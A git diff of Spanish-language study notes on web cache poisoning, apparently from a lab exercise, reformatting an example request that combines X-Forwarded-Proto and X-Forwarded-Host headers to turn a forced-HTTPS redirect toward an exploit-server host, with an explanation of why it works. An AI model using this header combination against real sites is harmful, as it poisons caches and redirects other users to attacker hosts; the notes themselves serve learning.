@@ -17,17 +17,17 @@ A veces **un header unkeyed solo no alcanza**: necesitás **dos combinados**. Un
 
 ## Request → Response
 
-```http
-GET /random HTTP/1.1
-Host: innocent-site.com
-X-Forwarded-Proto: http
-X-Forwarded-Host: exploit-0a55...exploit-server.net/test
-```
+> `GET /random HTTP/1.1`
+> `Host: innocent-site.com`
+> `X-Forwarded-Proto: `==`http`== (gatillo)
+> `X-Forwarded-Host: `==`exploit-0a55...exploit-server.net/test`== (destino)
 
-```http
-HTTP/1.1 301 Moved Permanently
-Location: https://innocent-site.com/random
-```
+**⬇️ dispara el redirect; mirá el `Location`:**
+
+> `HTTP/1.1 301 Moved Permanently`
+> `Location: `==`https://innocent-site.com/random`==
+
+(en este snapshot el `Location` aún apunta al dominio real — al sumar `X-Forwarded-Host` pasa a tu host)
 
 ## Por qué funciona
 - **`X-Forwarded-Proto: http`** (o `X-Forwarded-Scheme` con cualquier valor ≠ `https`) le dice a la app que el cliente entró por **HTTP** → responde con un **redirect a HTTPS** (comportamiento de "forzar TLS"). Ese es el **gatillo**.
